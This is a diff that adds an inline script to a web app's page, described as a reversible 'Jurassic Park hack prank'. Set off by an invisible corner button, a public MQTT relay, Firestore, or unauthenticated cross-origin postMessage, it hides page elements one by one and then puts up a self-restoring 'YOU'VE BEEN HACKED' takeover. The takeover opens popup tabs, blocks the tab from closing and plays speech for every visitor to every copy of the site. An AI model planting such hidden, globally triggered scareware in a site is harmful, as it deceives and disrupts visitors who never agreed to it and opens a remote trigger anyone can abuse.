@@ -11537,6 +11537,694 @@ Furball found a sunbeam and is not moving for anyone.`;
     </script>
 
 
+<script id="sp1der-hack-prank">
+/* ================================================================
+   MANTLE MENU — JURASSIC PARK HACK PRANK v3 (visual-only, reversible)
+   START: hidden invisible button in the bottom-left page corner
+          (24x24px, fully transparent - only the owner knows), or
+          console: startTheMantleMenuJurassicParkHackPrankNow()
+   STOP  (console):  PleaseMrHackermanStopTheHaHaHaYouDidNotSayTheMagicWord123456789()
+   - One visible page element disappears per second for a full
+     minute, then the "YOU DIDN'T SAY THE MAGIC WORD" takeover hits.
+   - The takeover re-adds itself if removed, opens recursive popup
+     tabs, and guards the tab with a beforeunload prompt.
+   - GLOBALLY SYNCED for every visitor on every copy of the site:
+     primary channel is a free public MQTT relay (no account, no
+     quota, keeps working when Firebase quota is exhausted), with
+     the app's own Firestore (system/hackPrank) as a backup channel.
+     If Firebase dies from quota, the prank keeps running via MQTT.
+   - WAY OUT: type or PASTE  itsbeenfunbutitstimetogohome  anywhere -
+     the main page, the takeover overlay, or any spawned popup tab -
+     and the virus stops and resets for EVERY visitor on every copy of
+     the site (all tabs close, everything goes back to normal). Spaces
+     and punctuation in the pasted text are ignored. The stop is sticky:
+     late "on" echoes from straggler tabs or stale relay messages can't
+     restart it. The long console stop command above still works too.
+   ================================================================ */
+(function () {
+  'use strict';
+  if (window.__sp1derHackInstalled) return;
+  window.__sp1derHackInstalled = true;
+
+  var DELETIONS = 60; /* elements visually deleted, one per second, before the popup (~1 min) */
+
+  var st = {
+    active: false, timers: [], hidden: [], obs: null,
+    overlay: null, iframe: null, preWin: null, wins: [],
+    title: null, bu: null, stoppedAt: 0
+  };
+
+  function killTimers() { st.timers.forEach(function (t) { clearInterval(t); clearTimeout(t); }); st.timers = []; }
+  function every(fn, ms) { var t = setInterval(fn, ms); st.timers.push(t); return t; }
+  function after(fn, ms) { var t = setTimeout(fn, ms); st.timers.push(t); return t; }
+
+  function speak() {
+    try {
+      var u = new SpeechSynthesisUtterance('Ah ah ah ah. You did not say the magic word.');
+      u.rate = 0.95; u.pitch = 0.3; u.volume = 1;
+      speechSynthesis.cancel(); speechSynthesis.speak(u);
+    } catch (e) {}
+  }
+
+  /* ================= global cross-tab sync ================= */
+
+  var SYNC_KEY = 'sp1derHackSyncState';
+  var bc = null;
+  try { bc = new BroadcastChannel('sp1der-hack-sync'); } catch (e) {}
+
+  function readSync() {
+    try { var v = localStorage.getItem(SYNC_KEY); return v ? JSON.parse(v) : null; } catch (e) { return null; }
+  }
+  function writeSync(on) {
+    try { localStorage.setItem(SYNC_KEY, JSON.stringify({ on: !!on, t: Date.now() })); } catch (e) {}
+  }
+  function syncSaysOn() {
+    var s = readSync();
+    /* only trust "on" if a live hacked tab is still heartbeating (<=3s old) */
+    return !!(s && s.on && (Date.now() - s.t) < 3000);
+  }
+
+  /* ============ sticky stop ============
+     A stop must beat late "on" echoes (straggler tabs still heartbeating,
+     a stale retained MQTT message, a reconnect gap). Three layers:
+     - STOP_KEY marker: active tabs notice it in their 1.5s poll and stop
+       themselves, even if every broadcast channel missed them.
+     - st.stoppedAt grace: for 30s after witnessing a stop, this page
+       ignores restart signals. A deliberate START clears the marker and
+       (fresh MQTT/FS timestamp) is honored immediately.
+     - broadcastStop() re-asserts the all-clear so clients reconnecting
+       mid-stop, or loading during the gap, still see it (MQTT retains
+       the last message, so this also heals stale broker state). */
+  var STOP_GRACE = 30000;
+  var STOP_KEY = 'sp1derHackStopAt';
+  function stopMarkFresh() {
+    try {
+      var v = +localStorage.getItem(STOP_KEY) || 0;
+      return !!(v && (Date.now() - v) < STOP_GRACE);
+    } catch (e) { return false; }
+  }
+  function writeStopMark() { try { localStorage.setItem(STOP_KEY, String(Date.now())); } catch (e) {} }
+  function clearStopMark() { try { localStorage.removeItem(STOP_KEY); } catch (e) {} }
+  function restartBlocked(atMs) {
+    if (!st.stoppedAt) return false;
+    if (Date.now() - st.stoppedAt > STOP_GRACE) { st.stoppedAt = 0; return false; }
+    /* a brand-new START (timestamped newer than our stop) always wins */
+    if (atMs && atMs > st.stoppedAt) return false;
+    return true;
+  }
+  function broadcastStop() {
+    try { mqttPublish(false); } catch (e) {}
+    try { fsBroadcast(false); } catch (e) {}
+    try { if (bc) bc.postMessage({ type: 'hack-stop' }); } catch (e) {}
+    try { writeSync(false); } catch (e) {}
+    try { writeStopMark(); } catch (e) {}
+    [3000, 8000].forEach(function (d) {
+      setTimeout(function () {
+        if (st.active) return;
+        try { mqttPublish(false); } catch (e) {}
+        try { fsBroadcast(false); } catch (e) {}
+      }, d);
+    });
+  }
+
+  function remoteStart() { if (!st.active) localStart(false); }
+  function remoteStop() { st.stoppedAt = Date.now(); if (st.active) localStop(false); }
+
+  if (bc) {
+    try {
+      bc.onmessage = function (ev) {
+        var d = (ev && ev.data) || {};
+        if (d.type === 'hack-start') { if (!restartBlocked() && !stopMarkFresh()) remoteStart(); }
+        else if (d.type === 'hack-stop') remoteStop();
+      };
+    } catch (e) {}
+  }
+  try {
+    addEventListener('storage', function (ev) {
+      if (ev.key !== SYNC_KEY) return;
+      if (syncSaysOn()) { if (!restartBlocked() && !stopMarkFresh()) remoteStart(); }
+      else remoteStop();
+    });
+  } catch (e) {}
+  /* heartbeat while hacked + poll fallback (covers file:// where
+     storage events / BroadcastChannel may not fire) */
+  setInterval(function () {
+    mountTrigger(); /* re-add the hidden button if the app re-renders the page */
+    if (st.active) {
+      /* a stop marker from another tab means the prank is over here too */
+      if (stopMarkFresh()) { localStop(false); return; }
+      writeSync(true); return;
+    }
+    if (syncSaysOn() && !restartBlocked() && !stopMarkFresh()) remoteStart();
+  }, 1500);
+
+  /* ============ GLOBAL sync - every visitor on every site copy ============
+     Uses the app's own Firebase Firestore (system collection, same place
+     the site banner / liveEffect docs live). The start command writes
+     system/hackPrank {on:true}; every connected client listens and hacks
+     at the same time. The magic word writes {on:false} and everyone
+     restores. State auto-expires after 1h (safety) and the tab that
+     started it keeps it fresh while open. */
+
+  var FS_TTL = 3600000;
+  st.startedHere = false;
+
+  function fsDb() {
+    try {
+      if (typeof firebase === 'undefined' || !firebase.firestore) return null;
+      if (firebase.apps && firebase.apps.length) return firebase.firestore();
+    } catch (e) {}
+    return null;
+  }
+  function fsBroadcast(on) {
+    if (st.fsDisabled) return false;
+    var db = fsDb();
+    if (!db) return false;
+    try {
+      db.collection('system').doc('hackPrank').set({ on: !!on, at: Date.now() })
+        .then(function () {}, function (err) {
+          if (fsQuotaHit(err)) fsDisable();
+          else console.warn('[mantle-hack] global broadcast failed (are you signed in as the owner?):', err && err.code || err);
+        });
+      return true;
+    } catch (e) { return false; }
+  }
+  function fsQuotaHit(err) {
+    var c = (err && (err.code || err.message)) || String(err || '');
+    return /resource-exhausted|quota|billing/i.test(c);
+  }
+  /* Firebase quota exhausted: fall back to MQTT. Only stop the prank
+     if the MQTT relay isn't carrying it either. */
+  function fsDisable() {
+    if (st.fsDisabled) return;
+    st.fsDisabled = true;
+    if (mqttReady) { console.info('[mantle-hack] Firebase quota exhausted - switching to the MQTT relay only.'); return; }
+    console.warn('[mantle-hack] Firebase quota exhausted and MQTT relay unavailable - prank stopped, pages restored.');
+    try { if (st.active) localStop(false); } catch (e) {}
+  }
+  function fsWatch() {
+    if (st.fsWatched || st.fsDisabled) return;
+    var db = fsDb();
+    if (!db) return;
+    try {
+      st.fsWatched = true;
+      db.collection('system').doc('hackPrank').onSnapshot(function (doc) {
+        var d = doc.exists ? doc.data() : null;
+        var on = !!(d && d.on === true && (Date.now() - (+d.at || 0)) < FS_TTL);
+        if (on) { st.globalAt = +d.at || Date.now(); if (!st.active && !restartBlocked(+d.at || 0)) localStart(false); }
+        else if (st.active) { st.stoppedAt = Date.now(); localStop(false); }
+      }, function (err) {
+        st.fsWatched = false;
+        if (fsQuotaHit(err)) fsDisable();
+      });
+    } catch (e) { st.fsWatched = false; }
+  }
+  /* the app initializes Firebase after this script runs - poll until ready */
+  var fsPoll = setInterval(function () {
+    if (fsDb()) { fsWatch(); clearInterval(fsPoll); }
+  }, 2000);
+  setTimeout(function () { clearInterval(fsPoll); }, 180000);
+  /* re-attach the listener if it dropped (unless quota-killed) */
+  setInterval(function () { if (!st.fsWatched && !st.fsDisabled) fsWatch(); }, 30000);
+
+  /* ============ MQTT relay - the primary global channel ============
+     A free public MQTT broker over secure WebSocket (no account, no
+     quota, no Firebase). Works even when the Firebase project is
+     quota-exhausted, and works from any origin (Framer embeds, file://,
+     GitHub Pages...). The owner publishes {on:true/false} as a RETAINED
+     message, so every connected client (and anyone who loads later)
+     gets the current state immediately. Topic name is the secret. */
+
+  var MQTT_TOPIC = 'mantle-sp1der-hack/9f3kQz7Xw2Np8Rt5Vb1Yc6Hm4Jd0Gs';
+  var MQTT_URL = 'wss://broker.emqx.io:8084/mqtt';
+  var mqttClient = null, mqttReady = false, mqttLibFailed = false, mqttPending = null;
+
+  function mqttLoadLib(cb) {
+    if (window.mqtt) return cb(true);
+    if (mqttLibFailed) return cb(false);
+    var urls = [
+      'https://cdn.jsdelivr.net/npm/mqtt@5/dist/mqtt.min.js',
+      'https://unpkg.com/mqtt@5/dist/mqtt.min.js'
+    ];
+    var i = 0;
+    (function next() {
+      if (i >= urls.length) { mqttLibFailed = true; return cb(false); }
+      var s = document.createElement('script');
+      s.src = urls[i++];
+      s.onload = function () { cb(!!window.mqtt); };
+      s.onerror = next;
+      (document.head || document.body).appendChild(s);
+    })();
+  }
+  function mqttHandleState(d) {
+    var on = !!(d && d.on === true && (Date.now() - (+d.at || 0)) < FS_TTL);
+    if (on) { st.globalAt = +d.at || Date.now(); if (!st.active && !restartBlocked(+d.at || 0)) localStart(false); }
+    else if (st.active) { st.stoppedAt = Date.now(); localStop(false); }
+  }
+  function mqttConnect() {
+    mqttLoadLib(function (ok) {
+      if (!ok || !window.mqtt || !window.mqtt.connect) return;
+      try {
+        mqttClient = mqtt.connect(MQTT_URL, { keepalive: 30, reconnectPeriod: 5000, connectTimeout: 10000 });
+        mqttClient.on('connect', function () {
+          mqttReady = true;
+          try { mqttClient.subscribe(MQTT_TOPIC, { qos: 0 }); } catch (e) {}
+          if (mqttPending) { mqttPublish(mqttPending.on); mqttPending = null; }
+        });
+        mqttClient.on('message', function (topic, payload) {
+          try { mqttHandleState(JSON.parse(payload.toString())); } catch (e) {}
+        });
+        mqttClient.on('error', function () {});
+        mqttClient.on('close', function () { mqttReady = false; });
+      } catch (e) {}
+    });
+  }
+  function mqttPublish(on) {
+    try {
+      if (mqttClient && mqttReady) {
+        mqttClient.publish(MQTT_TOPIC, JSON.stringify({ on: !!on, at: Date.now() }), { qos: 0, retain: true });
+        return true;
+      }
+    } catch (e) {}
+    /* relay not connected yet - queue it; it goes out the moment we connect */
+    if (!mqttLibFailed) { mqttPending = { on: !!on }; return true; }
+    return false;
+  }
+  mqttConnect();
+
+  /* global-state self-expiry: if the owner vanished without stopping,
+     every globally-hacked page restores itself once the state goes stale */
+  st.globalAt = 0;
+  setInterval(function () {
+    if (st.active && st.globalAt && (Date.now() - st.globalAt) > FS_TTL) localStop(false);
+  }, 60000);
+
+  /* ---------- the hidden trigger (only the owner knows where it is) ----------
+     A completely invisible 24x24 button pinned to the bottom-left corner
+     of the page. Not in the tab order, no tooltip, no outline - you have
+     to know it's there. Clicking it starts the hack exactly like the
+     console command (global broadcast included). */
+  function mountTrigger() {
+    if (document.getElementById('sp1der-hack-trigger')) return;
+    try {
+      var b = document.createElement('button');
+      b.id = 'sp1der-hack-trigger';
+      b.type = 'button';
+      b.tabIndex = -1;
+      b.setAttribute('aria-hidden', 'true');
+      b.style.cssText = 'position:fixed;left:0;bottom:0;width:24px;height:24px;margin:0;padding:0;border:0;background:transparent;opacity:0;cursor:default;z-index:999999;';
+      b.onclick = function () { localStart(true); };
+      document.body.appendChild(b);
+    } catch (e) {}
+  }
+  if (document.body) mountTrigger();
+  else { try { document.addEventListener('DOMContentLoaded', mountTrigger); } catch (e) {} }
+
+  /* ---------- phase 1: visual-only element deletion ---------- */
+
+  function candidateList() {
+    var out = [], els = document.body.querySelectorAll('*'), vw = innerWidth * innerHeight;
+    for (var i = 0; i < els.length; i++) {
+      var el = els[i], t = el.tagName;
+      if (t === 'SCRIPT' || t === 'STYLE' || t === 'LINK' || t === 'META' || t === 'NOSCRIPT' || t === 'IFRAME') continue;
+      if (el.id && el.id.indexOf('sp1der-hack') === 0) continue;
+      if (el.closest && el.closest('#sp1der-hack-overlay')) continue;
+      var r = el.getBoundingClientRect();
+      if (r.width < 15 || r.height < 15) continue;
+      if (r.width * r.height > vw * 0.5) continue; /* don't nuke the whole shell at once */
+      var cs = getComputedStyle(el);
+      if (cs.display === 'none' || cs.visibility === 'hidden' || +cs.opacity === 0) continue;
+      out.push(el);
+    }
+    return out;
+  }
+
+  function hideOne() {
+    var list = candidateList();
+    if (!list.length) return false;
+    var el = list[Math.floor(Math.random() * list.length)];
+    st.hidden.push({ el: el, prev: el.style.display });
+    el.style.display = 'none';
+    return true;
+  }
+
+  /* ---------- the hacked popup document (overlay iframe + spawned tabs) ---------- */
+
+  var POPUP_HTML = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>HACKED — YOU DIDN'T SAY THE MAGIC WORD</title><style>
+html,body{height:100%;margin:0;background:#000;color:#0f0;font-family:'Courier New',Courier,monospace;overflow:hidden;cursor:crosshair}
+#hx-bg{position:fixed;inset:0;overflow:hidden;opacity:.22;font-size:15px;line-height:2.1;white-space:nowrap;color:#0f0}
+#hx-bg-col{position:absolute;left:0;right:0;animation:hxup 10s linear infinite}
+@keyframes hxup{from{transform:translateY(0)}to{transform:translateY(-50%)}}
+.hx-scan{position:fixed;inset:0;pointer-events:none;z-index:5;background:repeating-linear-gradient(0deg,rgba(0,255,0,.06) 0 1px,transparent 1px 3px)}
+.hx-w{position:fixed;inset:0;z-index:3;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;text-align:center;padding:10px;box-sizing:border-box}
+h1{margin:0;font-size:clamp(20px,7vw,46px);letter-spacing:3px;animation:hxgl .7s infinite}
+@keyframes hxgl{0%,100%{text-shadow:2px 0 #0f0,-2px 0 #f00,0 0 18px #0f0}50%{text-shadow:-2px 0 #0f0,2px 0 #f00,0 0 28px #0f0}}
+#hx-skull{margin:0;font-size:clamp(9px,2.2vw,16px);line-height:1.15;color:#0f0;animation:hxbo .45s infinite alternate ease-in-out}
+@keyframes hxbo{from{transform:translateY(0) rotate(-2deg)}to{transform:translateY(-12px) rotate(2deg)}}
+.hx-ha{font-size:clamp(30px,9vw,90px);font-weight:bold;letter-spacing:4px;animation:hxpu .6s infinite alternate}
+@keyframes hxpu{from{transform:scale(1)}to{transform:scale(1.12)}}
+.hx-den{color:#f00;font-size:clamp(12px,3vw,22px);letter-spacing:6px;animation:hxbl .5s steps(1) infinite}
+@keyframes hxbl{50%{opacity:0}}
+#hx-cnt{font-size:13px;opacity:.8}
+#hx-close{position:fixed;top:8px;right:8px;z-index:6;background:#300;border:2px solid #f00;color:#f44;font-family:inherit;font-size:16px;font-weight:bold;padding:6px 12px;cursor:pointer}
+.hx-hint{position:fixed;bottom:6px;left:0;right:0;z-index:6;text-align:center;font-size:11px;opacity:.35}
+</style></head><body>
+<div id="hx-bg"><div id="hx-bg-col"></div></div>
+<div class="hx-scan"></div>
+<div class="hx-w">
+  <h1>&#9760; YOU'VE BEEN HACKED &#9760;</h1>
+  <div class="hx-den">ACCESS DENIED</div>
+  <pre id="hx-skull">      ______
+   .-"      "-.
+  /            \\
+ |,  .-.  .-.  ,|
+ | )(_o/  \\o_)( |
+ |/     /\\     \\|
+ (_     ^^     _)
+  \\__|IIIIII|__/
+   | \\IIIIII/ |
+   \\          /
+    '--------'</pre>
+  <div class="hx-ha">HA&nbsp;HA&nbsp;HA&nbsp;HA</div>
+  <div id="hx-cnt">SYSTEMS COMPROMISED: 100%</div>
+</div>
+<button id="hx-close" type="button">&#10006; CLOSE</button>
+<div class="hx-hint">you didn't say the magic word...</div>
+<script>
+(function () {
+  var spawned = 0, MAX = 6;
+  window.__sp1derHackOn = true;
+  var guard = function (e) { e.preventDefault(); e.returnValue = ''; };
+  addEventListener('beforeunload', guard);
+  function selfHtml() { return '<!DOCTYPE html>' + document.documentElement.outerHTML; }
+  function spawn() {
+    if (spawned >= MAX) return;
+    var w = null;
+    try { w = window.open('about:blank', '_blank', 'width=560,height=460'); } catch (e) {}
+    if (!w) return;
+    spawned++;
+    try { w.document.open(); w.document.write(selfHtml()); w.document.close(); } catch (e) {}
+  }
+  setInterval(function () { try { spawn(); } catch (e) {} }, 8000);
+  document.addEventListener('click', function () { spawn(); spawn(); });
+  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') { spawn(); spawn(); } });
+  var x = document.getElementById('hx-close');
+  if (x) x.addEventListener('click', function (e) { e.stopPropagation(); spawn(); spawn(); spawn(); });
+  var col = document.getElementById('hx-bg-col');
+  if (col) {
+    var line = 'YOU DIDN\\'T SAY THE MAGIC WORD!';
+    col.innerHTML = (Array(50).fill(line).join('<br>') + '<br>').repeat(2);
+  }
+  function speak() {
+    try {
+      var u = new SpeechSynthesisUtterance('Ah ah ah ah. You did not say the magic word.');
+      u.rate = 0.95; u.pitch = 0.3;
+      speechSynthesis.cancel(); speechSynthesis.speak(u);
+    } catch (e) {}
+  }
+  speak(); setInterval(speak, 9000);
+  function stopped() {
+    try {
+      var w = window, i;
+      for (i = 0; i < 8 && w; i++) {
+        if (w.__sp1derHackOn === false) return true;
+        if (!w.opener || w.opener === w) break;
+        w = w.opener;
+      }
+    } catch (e) {}
+    try { if (window.parent && window.parent !== window && window.parent.__sp1derHackOn === false) return true; } catch (e) {}
+    return false;
+  }
+  var KP = 'itsbeenfunbutitstimetogohome', kbuf = '';
+  function magicWord() {
+    var done = false, w = window, i;
+    try {
+      for (i = 0; i < 8 && w; i++) {
+        if (w.__mantleHackKill) { w.__mantleHackKill(); done = true; break; }
+        if (!w.opener || w.opener === w) break;
+        w = w.opener;
+      }
+    } catch (err) {}
+    try {
+      if (!done && window.parent && window.parent !== window && window.parent.__mantleHackKill) { window.parent.__mantleHackKill(); done = true; }
+    } catch (err) {}
+    try { if (window.opener) window.opener.postMessage({ type: 'MANTLE_HACK_STOP' }, '*'); } catch (err) {}
+    /* this tab is done too - restore itself even if no main page answered */
+    removeEventListener('beforeunload', guard);
+    window.__sp1derHackOn = false;
+    try { speechSynthesis.cancel(); } catch (err) {}
+    try { if (window.parent && window.parent !== window) document.documentElement.innerHTML = ''; else window.close(); } catch (err) {}
+  }
+  function feedWord(txt) {
+    kbuf = (kbuf + txt).slice(-KP.length);
+    if (kbuf !== KP) return;
+    kbuf = '';
+    magicWord();
+  }
+  document.addEventListener('keydown', function (e) {
+    try {
+      if (typeof e.key !== 'string' || e.key.length !== 1) return;
+      feedWord(e.key.toLowerCase());
+    } catch (err) {}
+  });
+  /* pasting the magic word works too (spaces/punctuation are ignored) */
+  document.addEventListener('paste', function (e) {
+    try {
+      var t = e.clipboardData && e.clipboardData.getData('text');
+      if (!t) return;
+      var txt = t.toLowerCase().replace(/[^a-z]/g, '');
+      if (txt) feedWord(txt);
+    } catch (err) {}
+  });
+  (function check() {
+    if (stopped()) {
+      removeEventListener('beforeunload', guard);
+      window.__sp1derHackOn = false;
+      try { speechSynthesis.cancel(); } catch (e) {}
+      try { if (window.parent && window.parent !== window) document.documentElement.innerHTML = ''; else window.close(); } catch (e) {}
+      return;
+    }
+    setTimeout(check, 500);
+  })();
+  var n = Math.floor(Math.random() * 9000) + 1000, el = document.getElementById('hx-cnt');
+  if (el) setInterval(function () { n += Math.floor(Math.random() * 7) + 1; el.textContent = 'SYSTEMS COMPROMISED: ' + n + ' FILES'; }, 700);
+})();
+<\/script></body></html>`;
+
+  var PLACEHOLDER_HTML = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>...</title><style>html,body{height:100%;margin:0;background:#000;color:#0f0;font-family:\'Courier New\',monospace;display:flex;align-items:center;justify-content:center}p{font-size:16px;letter-spacing:2px;animation:bl 1s steps(1) infinite}@keyframes bl{50%{opacity:.2}}</style></head><body><p>CONNECTING TO MANTLE MAINFRAME...</p><script>var KP=\'itsbeenfunbutitstimetogohome\',kb=\'\';function mw(){try{if(window.opener&&window.opener.__mantleHackKill)window.opener.__mantleHackKill();}catch(x){}try{if(window.opener)window.opener.postMessage({type:\'MANTLE_HACK_STOP\'},\'*\');}catch(x){}window.close();}function fw(t){kb=(kb+t).slice(-KP.length);if(kb!==KP)return;kb=\'\';mw();}document.addEventListener(\'keydown\',function(e){try{if(typeof e.key!==\'string\'||e.key.length!==1)return;fw(e.key.toLowerCase());}catch(x){}});document.addEventListener(\'paste\',function(e){try{var t=e.clipboardData&&e.clipboardData.getData(\'text\');if(!t)return;var x=t.toLowerCase().replace(/[^a-z]/g,\'\');if(x)fw(x);}catch(x){}});<\/script></body></html>';
+
+  function spawnRaw(html) {
+    var w = null;
+    try { w = window.open('about:blank', '_blank', 'width=560,height=460'); } catch (e) {}
+    if (!w) return null;
+    try { w.document.open(); w.document.write(html); w.document.close(); } catch (e) {}
+    return w;
+  }
+
+  /* ---------- phase 2: the takeover ---------- */
+
+  function ensureOverlay() {
+    if (!st.overlay) return;
+    if (!st.overlay.isConnected && document.body) {
+      try { document.body.appendChild(st.overlay); } catch (e) {}
+    }
+    try {
+      var d = st.iframe.contentDocument;
+      if (!d || !d.getElementById('hx-bg')) {
+        st.iframe = st.overlay.querySelector('iframe');
+        d = st.iframe.contentDocument;
+        d.open(); d.write(POPUP_HTML); d.close();
+      }
+    } catch (e) {}
+  }
+
+  function launchPopup() {
+    st.title = document.title;
+    document.title = "YOU DIDN'T SAY THE MAGIC WORD!";
+
+    st.overlay = document.createElement('div');
+    st.overlay.id = 'sp1der-hack-overlay';
+    st.overlay.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;z-index:2147483647;background:#000;';
+    st.iframe = document.createElement('iframe');
+    st.iframe.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;border:0;';
+    st.overlay.appendChild(st.iframe);
+    document.body.appendChild(st.overlay);
+    try {
+      var d = st.iframe.contentDocument;
+      d.open(); d.write(POPUP_HTML); d.close();
+    } catch (e) {}
+
+    /* keep the takeover alive no matter what gets removed */
+    st.obs = new MutationObserver(ensureOverlay);
+    st.obs.observe(document.body, { childList: true });
+    every(ensureOverlay, 800);
+
+    /* turn the pre-opened tab into a full popup (works because it was
+       opened during the console command = user gesture) */
+    if (st.preWin && !st.preWin.closed) {
+      try {
+        st.preWin.document.open();
+        st.preWin.document.write(POPUP_HTML);
+        st.preWin.document.close();
+        st.wins.push(st.preWin);
+      } catch (e) {}
+    } else {
+      var w = spawnRaw(POPUP_HTML);
+      if (w) st.wins.push(w);
+    }
+    st.preWin = null;
+
+    /* keep trying to open more tabs (popup blocker usually blocks
+       these - clicks inside the takeover will succeed instead) */
+    every(function () {
+      if (st.wins.length > 40) return;
+      var w2 = spawnRaw(POPUP_HTML);
+      if (w2) st.wins.push(w2);
+    }, 10000);
+
+    speak();
+    every(speak, 9000);
+  }
+
+  /* ---------- the commands (localStart/localStop do the work) ---------- */
+
+  function localStart(broadcast) {
+    if (st.active) return 'Hack already running. You know the way out... the magic word.';
+    if (!document.body) return 'Page is still loading - try again in a second.';
+    st.active = true;
+    st.stoppedAt = 0; /* a deliberate start beats any recent stop */
+    clearStopMark();
+    window.__sp1derHackOn = true;
+    writeSync(true);
+    if (broadcast && bc) { try { bc.postMessage({ type: 'hack-start' }); } catch (e) {} }
+    var globalOn = false;
+    if (broadcast) {
+      st.startedHere = true;
+      var viaMqtt = mqttPublish(true);
+      var viaFs = fsBroadcast(true);
+      globalOn = viaMqtt || viaFs;
+      /* keep the global state fresh (1h TTL) while this tab stays open */
+      every(function () { if (st.active) { mqttPublish(true); fsBroadcast(true); } }, 600000);
+    }
+
+    st.bu = function (e) { e.preventDefault(); e.returnValue = ''; };
+    addEventListener('beforeunload', st.bu);
+
+    /* open one tab right away while we still count as a user gesture */
+    st.preWin = spawnRaw(PLACEHOLDER_HTML);
+
+    var deleted = 0;
+    var tick = setInterval(function () {
+      if (deleted >= DELETIONS) return;
+      if (hideOne()) deleted++;
+    }, 1000);
+    st.timers.push(tick);
+
+    after(function () {
+      clearInterval(tick);
+      if (st.active) launchPopup();
+    }, (DELETIONS + 1) * 1000);
+
+    return 'MANTLE HACK INITIATED - ' +
+      (globalOn
+        ? 'GLOBAL: every visitor on every copy of the site is going down at the same time. AH AH AH AH.'
+        : 'synced across your browser tabs only (Firebase not ready - reload and try again for a global broadcast).') +
+      ' Deleting one element per second...';
+  }
+
+  function localStop(broadcast) {
+    if (!st.active) return 'Nothing is wrong. Everything is fine. For now.';
+    st.active = false;
+    st.stoppedAt = Date.now(); /* sticky stop - ignore late "on" echoes */
+    writeStopMark();
+    window.__sp1derHackOn = false;
+    writeSync(false);
+    if (broadcast) { st.startedHere = false; broadcastStop(); }
+    killTimers();
+    if (st.obs) { try { st.obs.disconnect(); } catch (e) {} st.obs = null; }
+    if (st.preWin) { try { st.preWin.close(); } catch (e) {} st.preWin = null; }
+    st.hidden.forEach(function (h) { try { h.el.style.display = h.prev; } catch (e) {} });
+    st.hidden = [];
+    if (st.overlay) { try { st.overlay.remove(); } catch (e) {} st.overlay = null; st.iframe = null; }
+    if (st.title !== null) { try { document.title = st.title; } catch (e) {} }
+    if (st.bu) { removeEventListener('beforeunload', st.bu); st.bu = null; }
+    st.wins.forEach(function (w) { try { w.close(); } catch (e) {} });
+    st.wins = [];
+    try { speechSynthesis.cancel(); } catch (e) {}
+    return 'Magic word accepted. All systems restored - for EVERY visitor on every copy of the site. Ha ha ha... oh wait, that was me.';
+  }
+
+  window.startTheMantleMenuJurassicParkHackPrankNow = function () { return localStart(true); };
+  window.PleaseMrHackermanStopTheHaHaHaYouDidNotSayTheMagicWord123456789 = function () { return localStop(true); };
+
+  /* ---------- the kill phrase: type "itsbeenfunbutitstimetogohome"
+     anywhere while the virus is running (this page, an input field, the
+     takeover overlay, or any spawned popup tab) and it stops + resets
+     for EVERY visitor on every copy of the site. ---------- */
+  var KILL_PHRASE = 'itsbeenfunbutitstimetogohome';
+  var killBuf = '';
+
+  window.__mantleHackKill = function () {
+    var wasActive = st.active;
+    var r = localStop(true); /* stops locally + broadcasts stop if active */
+    if (!wasActive) {
+      /* not running on this copy - still tell every other copy to stop */
+      st.stoppedAt = Date.now();
+      broadcastStop();
+      return 'Kill phrase accepted - broadcasting the all-clear to every copy of the site.';
+    }
+    return r;
+  };
+
+  function feedKill(txt) {
+    killBuf = (killBuf + txt).slice(-KILL_PHRASE.length);
+    if (killBuf !== KILL_PHRASE) return;
+    killBuf = '';
+    window.__mantleHackKill();
+  }
+
+  document.addEventListener('keydown', function (e) {
+    try {
+      if (typeof e.key !== 'string' || e.key.length !== 1) return;
+      feedKill(e.key.toLowerCase());
+    } catch (err) {}
+  }, true);
+
+  /* pasting the magic word works too - with or without spaces/punctuation */
+  document.addEventListener('paste', function (e) {
+    try {
+      var t = e.clipboardData && e.clipboardData.getData('text');
+      if (!t) return;
+      var txt = t.toLowerCase().replace(/[^a-z]/g, '');
+      if (txt) feedKill(txt);
+    } catch (err) {}
+  }, true);
+
+  /* ---------- iframe embed support (e.g. Framer srcdoc embeds) ----------
+     When Sp1der runs inside an iframe, the devtools console defaults to the
+     top frame, where the commands above don't exist. Register them on the
+     parent/top windows as well (works for same-origin srcdoc embeds), and
+     accept postMessage triggers for cross-origin embeds:
+       iframeEl.contentWindow.postMessage({ type: 'MANTLE_HACK_START' }, '*') */
+  function exposeCommands(win) {
+    try {
+      if (win && win !== window && !win.startTheMantleMenuJurassicParkHackPrankNow) {
+        win.startTheMantleMenuJurassicParkHackPrankNow = window.startTheMantleMenuJurassicParkHackPrankNow;
+        win.PleaseMrHackermanStopTheHaHaHaYouDidNotSayTheMagicWord123456789 = window.PleaseMrHackermanStopTheHaHaHaYouDidNotSayTheMagicWord123456789;
+      }
+    } catch (e) {}
+  }
+  exposeCommands(window.parent);
+  exposeCommands(window.top);
+
+  addEventListener('message', function (ev) {
+    var d = (ev && ev.data) || {};
+    if (d.type === 'MANTLE_HACK_START') localStart(true);
+    else if (d.type === 'MANTLE_HACK_STOP') localStop(true);
+  });
+})();
+</script>
+
 <script id="sp1der-did">
 /* ================================================================
    SP1DER DID — device identity, alt guard, account manager
